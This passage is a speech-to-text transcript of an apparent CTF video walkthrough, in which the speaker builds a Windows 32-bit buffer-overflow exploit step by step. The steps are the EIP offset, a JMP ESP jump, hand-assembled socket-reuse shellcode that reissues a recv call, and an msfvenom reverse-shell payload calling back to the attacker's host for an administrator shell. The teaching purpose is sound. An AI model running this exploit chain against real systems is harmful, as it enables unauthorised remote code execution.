breakpoints and let's remove all them so we can just continue so input my code i'm gonna hit a bunch of a's we'll paste them in and then we see access violation if i look at the cpu we can see where is eip eip is 616161 which is lowercase a so we have successfully crashed it so the next piece we have to do is figure out exactly where we can overwrite eip and what other things we can do so we're going to find pattern create on our box and just use this msf pattern create binary to create something the length of 128 because really probably anything like over 70 is going to crash it because it's only allocating 50 bytes for this buffer so this should be completely fine and we have to start the binary back up so let's restart it grab the port it is 9934 connect and the username let's grab this the password we can grab it again incorrect this is getting annoying alfin s that i wonder if i should grab it in my echo statements i wonder if some character is just not getting printed out maybe that's it that looks the same to me but okay um i'm getting really confused by this but that is not out of the ordinary so i'm going to input this code and then we should crash over here and we can see eip is 4132 so we can copy this value and now we can go to pattern do offset dash q and search for that and we have an offset match at 66. so what i'm going to do is do python3 dash c print a times 66 plus would do four b's then plus a bunch of c's right um let's make that valid code let's see we don't have a single quote there there we go so now let's connect back to this 9934 we have to get the new port which is 9312. i should just look at exactly how the application always sets to be the same thing but i'm lazy like that so i'm going to grab this i'm going to grab them from my actual echoes instead of down below just in case it's different yeah a-l-f-i-n-s-y-h this is getting so confusing it's got to be user error somewhere weird but let's copy this name ipsec input this code and we should see eip to be set at bs so if i go back here we can see four two four two four two and then esp is going to be set to c's and importantly we don't have that much space in eip if we look at this let's see follow and dump we only have what one two three four five six seven eight nine ten characters we can do um occurred with so we really don't have much space in here however before we do have some space so what we could do is put a jump here to jump backwards to get over to here which gives us more space and this still isn't that much space it's 66 bytes because that's what it took to get here and while we could probably find some shell code to create a user in six like in this amount of space we can't add him to the administrator group i don't know any shell code that can do that that's underneath like 80 bytes so um we have to somehow free up some space or do some type of magic to get extra space here so what we're going to do is have this we're going to jump back here and then in this code we're going to do something called a socket reuse because the application every time like it's asking for data it's making a receive call and they're accepting data so we're going to use that receive call again to allocate another 400 bytes of space and then essentially jump to that so we're essentially just having the program ask for shell code and then execute that shell code so first off we should go over to pen tools so we can get our skeleton exploit working where we can jump backwards and start writing or socket reuse exploit so i'm going to go back over to my parrot i'm going to do a pane i'm going to call it exploit.pi then we're gonna do from pwn import star and then we set up the remote so 192.168.58.114 and this is the windows vm on my host and i'm gonna have the port be a argument so i'll just do sys.org v1 and we also have to now import cis because the port changes every time for some reason so we know junk and we can set junk to be when i do debugging i always like setting it to be a lot of breakpoints which is cc so we can do this times 66 and then we want the jump esp and we have to find where that is and then the next thing we need is jump back and then probably 70 because we want to jump here and we want to go like so in our payload we have esp which is going to be four bytes so we get the beginning of the junk so jump back 70 which is our esp length plus the junk is equal to something so let's get esp real quick so we can easily find that over here if we just right click on like the cpu pane go to all modules command jump esp and we should be able to pick any one i'm going to pick the very first one here so copy address and we can paste the address in here so p32 0x like that i believe and then we need jump back 70. so what i'm going to do is we're going to locate met asm and just execute this interpreter assembly shell and then we should be able just to [Music] um type exactly what we want so jump minus 70 maybe um no that's not it i think i had the arguments of the things correct just in the wrong order so there we go there's jump backward 70. so this is the instruction for that we're just going to do b and paste this in so now we should be able to create the payload is equal to junk plus jump esp plus jump back 70. okay and i think i'm going to go over back here before i forget um we can put f2 there so we set a breakpoint on this jump esp which is going to make it super easy to debug everything alternatively we could have like put the break point whoops like put a break point this way but i'd rather just set a break point on this address so there we go and then i read something cool in pawn tools let's see pawn tools receive and send is that a thing i know there's a function that will like receive line and then send receive and i'm not sure we'll just do it the old-fashioned easy way so r dot receive until and then ask us for the username and then we do r dot send line and hopefully i copy it right because then we've been having issues right so i copy that put it here paste this and then r dot receive until and it's going to ask us for the password next and then we want to send the password uh we need to code that as bytes go back to this pane copy this paste this and then we want to receive until full name so copy r dot receive until full name and i just want to go back real quick it is typed like that and no space so the next thing i want is to get until code so i'm just going to copy this and we can replace full name with the code and here we want to send her name so i'll send ipsec and this piece doesn't matter but the code this is where we finally um send our payload okay so as long as i typed everything correctly this should crash this program but we'll be able to see exactly where it crashes so i'm going to run this i'm going to look at the port 96149614 we open the connection connection created what did we we did something wrong receive until full name so i wonder if it did not get the password so nine seven one two nine seven one two up a connection it's not liking that that was weird i guess they wanted python39 okay i'm not exactly sure what happened but it works so we see we are at the break point that we set so this is the jump esp and i'm going to follow this and then it's just routed somewhere so we're going to oh we're getting a exception access because esp is on the stack and in my vm i have dep enabled so this exploit is going to require a host to not have depth and i don't know how to check that so we just kind of hope it does not have depth on on and this is one of those weird things um i can't fully explain exactly all the scenarios it does because like my vm defaulted to having dep enabled so if i go to let's see settings data execution so what i did um let's move this window real quick i just executed system properties advanced um you could also go to like computer let's see this pc properties i think find it through here somewhere uh system advanced system settings right so you can find it that way as well but then you go the advanced tab click on settings and then data execution and like my host os this is the default um maybe it's because my host os is windows pro and this vm is windows enterprise but the default setting for this was all programs except those i select on my host and what i'm hoping to target it's set to this which is for essential windows programs and services only so let's disable depth for a program so i'm going to go back to my desktop and we just select my first app and now data execution protection i think that's what dep is is now disabled for this application so i wish i knew how to check that on our target but the ways i know how to require administrator so we're back here let's look at the port 9179 let's go here 9179 we open the connection and now we paused so we hit our jump esp follow that and now um we are let's see at the start of a junk right so if i continue we are at all the junk characters so if i put something there so let's just try something real quick so v exploit dot pi let's do um let's see i'm just going to call this receive because that's what we want it called later but i'm going to do backslash x d3 a d c o i'm probably not doing this in the right order but i want to say it i want those registers for not registers i wanted to say dead card where i jump so let's see now we just got to change this it was 66 so we're going to multiply it by um 66 minus the length of receive so no matter what we put in this variable it's going to subtract it from a junk okay so let's go back here go back to our windows run it okay we are port nine five three five nine five three five i don't think that worked access violation that was not what we wanted 9597 that looks better nope let's see what's eip we screwed something up significantly oh i'm not encoding this so it's probably putting the b's for me and messed up my whole stack so let's try this as you can see very easy to make the smallest mistakes 9731 that was too fast i don't like that access violation i did not get the port 9773 so we are crashing somewhere i'm not doing what i thought i was going to do which isn't a big surprise so let's look at the exploit again let's see length of oh we did not put receive in our payload so um eb b8 let's say i got eb or there's probably going to be something truncated but yeah so i subtracted from a junk but did not um have this data so there we go so this time it'll work the difficulties of doing this while talking because this is pretty hard to begin with so nine nine seven nine nine nine seven nine okay that's good we hung which means we probably hit a break point i'm going to step in and this is going to be the jump back 70 so eb b8 so we hit jump esp we jump backwards and now you can see we're at dead code which is going to crash because this isn't valid assembly i just wanted to play with proving i can control everything exactly as i want so what we're going to have to do now is some little magic with the registers because let's see if we go back in gidra let's see i'm going to run it again we got to find a receive call let's see do we have one quickly probably happen if i break if not we're going to go in geeja get some memory addresses so let's go 9158 that's too fast oh okay oh well so let's see ipsec ipsec i'm looking for receive let's see i'm probably gonna have to just go in geija and get a memory address because i am not finding it here but what i'm trying to do is find what accepts ipsec and then i can um oh that's closing the socket so i should be close let's send see is there a call eax it's probably just above here move d word so okay so this is a receive call this is where we want to break because we need to get the receive socket or a handle so let's see we can break here first so i'm going to break at 71901d79 so this is going to be the call to receive to get data so let's now restart the application grab the port 9511 okay and now we broke here and this is the receive call and it pulls it off the stack and the very first parameter and receive is going to be the handle for the socket so if i just google receive like this i think let's see maybe at msdn to make sure it's windows so the first thing is the socket then this can be the output where the variable is stored then we got the length and the flags so there's four different parameters in receive so the first one we want to be able to grab this 294 then this is going to be the variable it sends it at and this is the size so it's accepting 400 bytes and then the flags are zero so in our assembly we're going to recreate all these numbers and these two are pretty much easy because they're kind of hard coded the difficult one is going to be getting the length because this is going to be i think an ebp and our buffer overflow actually overwrites where it's stored so i'm going to jump here so we're at the jump esp if we go into this then this is jump backwards now we're at the dead code this is where like the handle would be but it's not there however if we look at esp so let's see if i can follow this and memory oh i did not want to do memory map let's see okay so we're here so we want to look for i think it was like 298 and this being such a big font is messing me up so do we have it anywhere here scroll down oh it may be right here it may be 294 not 298. let's restart the program so we can get the handle i should always write these things down so nine one five one let's go here nine one five one open the connection okay so two ninety four so handle 294 okay that's the piece we need so we can jump to our esp and then we step in this is jump backwards and here we are this is where esp is i believe esp where is it ff18 so esp is highlighted and we want to find 294. and it should be somewhere here right here so shoot i'm trying to get both of these on the same screen so we need to go from ff60 to ff18 which i want to say that's like 48. let's go we have google here google 0x60 minus 0x18 0x60 minus 0x18 48. so 48 bytes off of esp is going to be the handle for a socket and we can't just create a new socket for receive because it will require like a new port and everything else so this is where the socket reuse gets its name because we're reusing the socket that's already created so this is where it's probably going to get a bit tough because we're going to have to hand craft some assembly to recreate this for us so met asm is down here okay and we want to go into exploit.pi and for the receive let's see we need to make a push esp to push it to the stack so push esp and that's backslash x 54 i'm going to put a bunch of spaces and we'll call this push esp so we save it to the stack and then we're going to pop it over to eax which is like our register for handling math and stuff so b so we're going to pop eax backslash x 58 pop eax and now we're free to do math because this is just the esp register and we need to add 48 to it so if i do add ax 48 we're gonna get a null byte and these are really bad whenever dealing with like networking sockets so i just know off that my head we can't have that so this makes it tough because we can't just add 48 however we can probably add something and then subtract it right so instead of adding 48 we can try adding 100 and we're still at this weird null byte so maybe 120 130 let's try 150 um 175 190 200 am i doing this wrong let's see 195 7 8 why is it always having this null byte add ax 400 that's better see 200 oh wait i realize what i'm doing wrong um i should be doing hex so let's try 100 hex there we go but we have a null byte here 101 there we go so if we added 101 to the register now we just have to get down to 48. so let's go back to google 0x101 minus 48. google 0x101 minus 0x48 so now we have to subtract b9 from the register so sub ax 0x b9 and this one has an all byte so that sucks um so let's try 190 okay so 901 so this looks good so go back to google 0x 190 minus 48 so let's subtract 148 so sub ax 0x 148 right yep and we don't have any null bytes here so i think this is going to be good op codes i think that's the right terminology but let's add them here so receive plus equals b like this and this is add ax 0x190 and then receive b and we just got to copy this and then we can say this is sub ax 0x148 and all this is going to do this is grab socket handler right and then we could say over here um do a little extra work because can't push 0x48 due to null bytes i don't know if i like that because now it's going into the assembly but we should remember exactly why that is and then what we have to do now is move um eax into esi so move esi the value of eax receive and i'm sure in pawn tools i can probably type out this assembly somehow and have it automatically do this for me um this is probably not the most efficient way to do it but for demoing it this is how we should show it so after this we can see exactly how this looks so i'm going to write this and they're going to exploit it and see what happens continue we're not listening yet hit a few more there we go nine zero two two so open connection hit all the breakpoints right so this is calling eax this is starting the receive which is on 294 as the handler so we jump esp we can skip that this is a jump backwards and now we're at the shell code we put so all we want to do is make sure 294 gets into esi so right now we're pushing esp to the stack so you can see right here that's going to go down here to the stack right there we go and now we're popping it up to eax and now we're going to add the 190 to this address and then we're going to subtract 148 and if we look at where this is ff60 ff60 it is 294 so we're going to move that into esi and we can see esi is now 294. so if we push this to the stack now we can control we can put the actual socket on the stack itself the issue we have right now is we're going to set up this receive call and um i'm probably going to get the terminology wrong it's a 50 50 chance and of course i'm always lose those but esp as we allocate data we slowly move up the stack like this and we're going to allocate like 400 bytes for a receive call and if we do that we're going to overwrite eip and crash the program so the next thing we want to do is change what esp is we could go down here and allocate enough space or we could just do a nasty hack and say let's jump it up here so jump higher so let's make sure esp is above eip so i'm going to sub esp and we're going to pick 0x64 and edit the exploit and show exactly this so move esp away from eip receive plus equals b and this will be copy paste and then sub esp 0x64 so let's see exactly what this looks like and for those people i experienced that know this my apologies for going so slow through this i'm trying to explain it the best of my ability so anyone can understand so 9597 and mainly so i can understand when i do this again in the future because this is not something i just have all memorized it took me a while to work through this problem so now we're here um we can continue here's the jump esp we go back go here we're putting our socket handler and now we're here so subtract esp64 so esp is here eip is here i'm going to go one and now esp is above so when i allocate a bunch of data i don't risk creating a buffer overflow on myself i'm just in a safe space right um it's probably gonna destroy the program but at least i won't crash and i'll get my shell first so that is what we did there and now this next piece we have to get all the flags back so um let's see let's redo this so let me go back here um stop start okay look at the port nine eight six two so nine eight six two so now what we're doing is rebuilding well rebuilding this so we're going to have to push um 0 then 400 then an address and then the socket handler so we have to push all the variables in that order let us start this we can't exactly just push zero because of the null byte however we can xor something and if we xor it with itself it will become zero so let's go to exploit so we're going to zero out the um register so this would be build receive call receive plus b backslash x31 back select db and this is xor ebx to ebx which is going to set the ebx register to nothing so the next thing we can do is push ebx and that will push zero on our stack so the flags is done now the next thing i think that was the 400 piece right we need to get that so i'm going to [Music] do add bh 0x400 uh what oh add let's restart this add bh0x400 no matching opcode oh wait um it's the ebx register we're trying to add to and that's short for bx not bh so let's try this again and we have a null byte here so i'm just going to do the four so now we have 404 so let's go up here receive b like this and this is going to be add bx0x404 and now we just want to push these so push ebx push esp for esp okay let's see exactly where we are real quick i'm guessing now i have to build the um memory address so let's see stop start run it i got the port wrong 9067 okay so we'll call eax now we go to the jump esp okay so here should be good now we're moving esp above this okay x-raying ebx so ebx should go to zero then we're pushing that to the stack so zero should go here now we're going to add 404 to ebx which is currently zero so we add 404 then we do that okay so yes we have the first two so now we have to get a memory address on it which is going to be let's see let's go back go back into the exploit so the next call we want to pop ebx receive plus equals dash of x by b pop ebx and then receive trying to think what we want to do with this address so do we have it here so this should go to well let's see exactly what that does real quick this is where i'm starting to struggle on this exploit if you can't tell let's see 9501 9501 sometimes i have to run it twice i don't understand that but let's see jump esp okay go here now ebx when we pop it is set to this which is above our current eip i believe ebx yep is right here so we want to change this to be somewhere in our junk because we're going to be loading the data we um write with a new receive and just gonna be lazy because we just um i believe subtracted 64 from esp and since these are the same i can just add 64 and i should be somewhere there so let's see um [Music] where am i let's go back here if i do 0x0253 fe a b i type of that f e a b plus 0x64 we go to ffof i believe so ff o-f so this is where we'd land we could do some math and make it a bit higher but as long as we're somewhere here it's not going to matter because when i weaponize this i'm going to change all these to be knobs and it'll just be a knob sled to where we are so um let's do that change see get out of this v exploit and the next piece we want to do is add ebx 0x64 add is it going to be ebx or bx i think this will be fine let's see b backslash x83 c3 64. and this will be add ebx 0x7c and then we can finalize it with push ebx so push ebx and then we'll want push esi and that should be the socket descriptor still so 0x53 push ebx and the next one let's just yank this 56 esi okay and then the last piece we're gonna have to do is call receive because we set up all of our arguments like this but we have to do the actual calling of the receive function so let's just go over into [Music] gidra and find where receive is so i wonder if i go back see do we have anything where am i let's just go cross references to login show references to log in and hope i can do this let's see so here's the socket we just defined the socket's address so thread created see user name pointer to external socket receive is this the memory address i want to say this is the memory address where we're going to grab it from where receive is so i'm going to copy this go here and we want to load that so move eax 0x oh god i don't know what that is so move eax let's see this clip would there we go 0x ac so hopefully this is going to be the receive call so we can copy this receive is equal to b like that and this will be uh move eax 0x71 908. to ac receive address and then finally we do call eax receive is equal to uh backslash x f f x of x um d zero there it is call eax okay hopefully this works so i'm going to go back here we're going to stop it run it again 9874 9874 push ebx i probably forgot to end a quote somewhere no let's see 25 plus equals i don't know why i reversed that there we go so we go back to our windows so i'd create it not sure exactly what happened there okay so we're at the call eax we jump we're at esp now this is jumping back and here's all our magic here we can see it's resolving to receive so that memory address was correct so here we're taking the socket address going back and ooh that may be wrong f0 that's an address that's 404 and 0. so that looks good but that does not because it was always like 290 something right it could just be um the handle changed that much but 9159 let's double check that 9159 okay so this should be 290. i'm guessing we screwed up somewhere okay so we do this this and this esi now should go to 290 it does see going oh 290. so i guess that one time it was just weird but nope that looks correct so if we go to this address the 26 let's just control z or control g 0 x 2 6 4 ff 10 and that's somewhere in here so that all should be good so i bet if we continued we hit another break point that one break point we hit was the receive call and now we're in this like um exception loop so i think we are pretty much good to go uh the next piece we're gonna have to do is create a metasploit um payload so msf venom dash p windows reverse shell tcp and i'm not doing the x64 like we did last time because this application is 32 bit so lhost let's get that so if config i'm 192 168 58.230 hell port is going to be 9001 i like doing exit is it how do i do exit func i think it's just exit func let's see yeah exit func is equal to thread so what this does is or exit of the shell is going to be a thread exit not a program exit so if we kill a shell it doesn't kill the program at least that's the idea and then dash fpy for python for format so we also need to say uh bad characters is 0x00 so this should do a shakata gnio however you pronounce that uh invalid payload windows reverse shell tcp what msf venom dash l payloads and we have to just figure out what that is so we're out of that shell let's do reverse shell windows see powershell oh underscore reverse underscore tcp so reverse let's see encrypted shell shell reverse tcp maybe i just mistyped reverse that looks like it's generating so once it builds this shell code we can pop it into a program so v exploit paste in that we do this receive i'm going to from time import sleep so we can wait a second because the receive isn't sending anything we just gotta wait a little bit after we send the payload for it to hit that receive call um i am going to change these um interrupts into a knob sled so change that to 90 sleep 1 and r dot send line buff and buff is our msf venom shell so it's not going to work in our debugger i don't know exactly why so i'm just going to close that i probably should have left it open but we'll see if it works 9138 so where is exploit 9138 run it open connection i did not listen on 9001. oh we got a shell so i guess it was just waiting for us um i'm gonna double check that just to be safe so we're waiting on connection we need to 9223 get it did we just crash it that is weird 9288 there we go didn't crash that time so maybe it's not 100 reliable but we have the shell and then if i exit this we'll see if this program closes so exit and looking back here the program stays open so i just want to change that exit thread real quick and then we'll test it against the target so exit thread fight take this off and we're just going to do this payload without that i just want to see if it forces the program to close when i exit my shell um just one of those things i always like testing to validate my knowledge when i say something because that may not be what it's doing oh deleted way too many lines well maybe i deleted exactly enough lines i don't know but there we go paste this save it and now we just have to get the new one so my first app 9533 we ran it we did not set up or listen we got the shell the application's still open i'm going to tape exit we're going to look here and the application closed we can show that again 9612 exploited so looking at this thread is open i'm going to minimize every other application so you can see that is open type exit here and it calls exit on the program and closes the whole thing so that's why that exit func thread is important so let's search it again we grab it and now let's set lhost to be 10 10 14 8 because we are testing it against the target and then let's make sure we're listing on 9001 so grab this buffer and then we'll throw it okay the exploit dot pi delete the lines paste it in and let's go look at the port nope we don't look at the port we have to edit this to be the target 10 10 11 115 the port is gonna be quad nines so nine nine nine nine we're already listening we're in and we have a shell so if i do who am i we're administrator so i can do users administrator desktop and we can get the root.text so that is the actual exploit hope you guys enjoyed that um i'm just going to re-explain this whole thing so feel free to stop watching or if you're confused by it um maybe this piece will help or maybe it'll make you more confused so we'll do our best so here all that buffer is is output from this so here what we're doing grab socket handler this is so we can read data on receive right now we're moving esp away from eip that should be the self-explanatory thing that's why like we just move it above eip so that way no matter what we put on it we don't overflow ourself uh build the receive call so this let's um zero out ebx and push this is for flags okay this one is allocate space for receive and if we looked at the arguments receive windows that is this the length so we push it and let's see we push esp i think we're just saving esp to the stack there let's see what do we do next um this was 64. because this is at ebx here and 64. i don't know why i did 7c that's weird um let's see so this would be set where data is saved to from receive okay so i think that may be pretty much it so hope you guys enjoyed the video take care and i will see you all next week